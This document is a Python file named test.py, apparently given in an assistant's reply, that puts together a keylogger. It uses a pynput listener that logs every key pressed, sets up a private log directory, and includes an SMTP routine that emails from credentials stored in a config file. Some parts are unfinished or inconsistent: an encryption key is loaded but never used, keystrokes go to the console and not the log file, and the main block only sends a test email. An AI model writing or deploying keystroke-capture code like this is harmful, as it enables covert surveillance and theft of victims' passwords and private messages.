Here's the content of the file `test.py` formatted with triple backticks and Python syntax highlighting:

```python
import os
import sys
import time
import smtplib
import configparser
import logging
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration management
CONFIG_FILE = 'config.ini'

def load_config():
    """Load and validate configuration from file."""
    config = configparser.ConfigParser()
    try:
        if not os.path.exists(CONFIG_FILE):
            raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
        config.read(CONFIG_FILE)
        # Validate required sections exist
        for section in ['email', 'logging', 'encryption']:
            if section not in config:
                raise ValueError(f"Missing required section: {section}")
        return {
            'email': {
                'from': config.get('email', 'from'),
                'to': config.get('email', 'to'),
                'password': config.get('email', 'password'),
                'smtp_server': config.get('email', 'smtp_server'),
                'smtp_port': config.getint('email', 'smtp_port')
            },
            'logging': {
                'dir': config.get('logging', 'dir'),
                'file': config.get('logging', 'file')
            },
            'encryption': {
                'key': config.get('encryption', 'key')
            }
        }
    except Exception as e:
        logger.error(f"Failed to load configuration: {e}")
        sys.exit(1)

def setup_directories(log_dir):
    """Ensure required directories exist with proper permissions."""
    try:
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, mode=0o700)  # Secure directory permissions
            logger.info(f"Created directory: {log_dir}")
    except Exception as e:
        logger.error(f"Failed to create directory {log_dir}: {e}")
        sys.exit(1)

def send_email(config, subject, body):
    """Send an email with the given subject and body."""
    try:
        with smtplib.SMTP(
            config['email']['smtp_server'],
            config['email']['smtp_port']
        ) as server:
            server.starttls()
            server.login(
                config['email']['from'],
                config['email']['password']
            )
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(
                config['email']['from'],
                config['email']['to'],
                message
            )
            logger.info("Email sent successfully")
    except Exception as e:
        logger.error(f"Failed to send email: {e}")

def on_press(key):
    """Handle key press events."""
    try:
        logger.info(f"Key pressed: {key}")
    except Exception as e:
        logger.error(f"Error handling key press: {e}")

def start_keylogger(log_file):
    """Start monitoring keyboard input."""
    setup_directories(os.path.dirname(log_file))
    with open(log_file, 'a') as f:
        f.write(f"\n\n--- New Session {time.ctime()} ---\n\n")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    config = load_config()
    # Example usage
    send_email(config, "Test Subject", "This is a test email body")
```